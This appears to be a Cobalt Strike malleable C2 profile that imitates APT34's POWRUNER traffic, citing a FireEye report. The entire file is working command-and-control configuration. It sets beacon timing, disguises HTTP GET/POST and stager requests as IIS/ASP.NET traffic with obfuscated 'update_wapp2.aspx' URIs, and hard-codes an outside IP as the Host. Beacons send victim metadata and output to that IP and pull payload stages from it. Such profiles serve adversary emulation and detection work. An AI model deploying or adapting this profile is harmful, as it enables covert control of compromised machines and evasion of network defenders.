#powruner - APT34
#taken from --> https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/update_wapp2.aspx";
    
    client {

        header "Host" "46.105.221.247";
        header "Connection" "Keep-Alive";
	
        
        metadata {
            netbios;
            parameter "version";


        }


    }

    server {

	header "Cache-Control" "private";
	header "Content-Type" "text/plain; charset=utf-8";	
	header "Server" "Microsoft-IIS/8.5";
	header "X-AspNet-Version" "4.0.30319";
	header "X-Powered-By" "ASP.NET";
        

        output {
            netbios;
	    prepend "     ";
	    prepend "not_now";
            print;
        }
    }
}

http-post {
    
    set uri "/update_Wapp2.aspx";
    set verb "GET";

    client {
       
	header "Host" "46.105.221.247";
        header "Connection" "Keep-Alive";
        
        output {
            netbios;
	    parameter "version";


        }
             
        id {
            base64url;
	    header "Cookie";

        }
    }

    server {

	header "Cache-Control" "private";
	header "Content-Type" "text/plain; charset=utf-8";	
	header "Server" "Microsoft-IIS/8.5";
	header "X-AspNet-Version" "4.0.30319";
	header "X-Powered-By" "ASP.NET";
        

        output {
            netbios;
            print;
        }
    }
}

http-stager {

	set uri_x86 "/Update_wapp2.aspx";
	set uri_x64 "/update_wapP2.aspx";

    client {
	header "Host" "46.105.221.247";
	header "Connection" "Keep-Alive";
    }

    server {
        header "Cache-Control" "private";
	header "Content-Type" "text/plain; charset=utf-8";	
	header "Server" "Microsoft-IIS/8.5";
	header "X-AspNet-Version" "4.0.30319";
	header "X-Powered-By" "ASP.NET";
    
    }


}

stage {
	#random
	set compile_time "07 Dec 2017 12:08:22";
	set userwx "false";
	set obfuscate "false";
	set image_size_x86 "305000";



}
